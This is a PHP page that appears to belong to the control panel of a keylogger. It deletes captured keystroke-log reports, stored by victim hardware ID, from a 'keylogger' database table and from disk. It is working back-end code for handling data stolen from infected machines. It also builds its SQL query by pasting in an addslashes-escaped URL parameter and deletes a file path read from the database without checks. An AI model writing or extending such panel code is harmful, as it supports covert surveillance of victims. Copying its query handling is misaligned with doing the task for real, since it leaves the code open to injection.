<?php include('header.php'); ?>

<?php

function safe_id($data){

    $data =  trim($data);
    $data =  strip_tags($data);
    $data =  htmlspecialchars($data);
    $data =  addslashes($data);
    
    return $data;
  }
  
$id = safe_id($_GET['id']);

    
        if(isset($id)){

            $q_hwid = mysqli_query($condb,"SELECT * FROM `keylogger` WHERE `ID_k`='$id'");
            $get_a = @mysqli_fetch_array($q_hwid);
            $hid = '../' .$get_a['File_keylog'];
            $hwid = $get_a['HWID'];
            unlink($hid);
            echo '</div><div class="alert alert-success text-center" role="alert"><h4>The report has been successfully deleted <a style="color:#000;" href="keylogger.php?hwid='.$hwid.'">Go Back</a> </h4></div>';
           mysqli_query($condb,"DELETE FROM `keylogger` WHERE `ID_k`='$id'");
        
    }



?>

<?php include('footer.php'); ?>
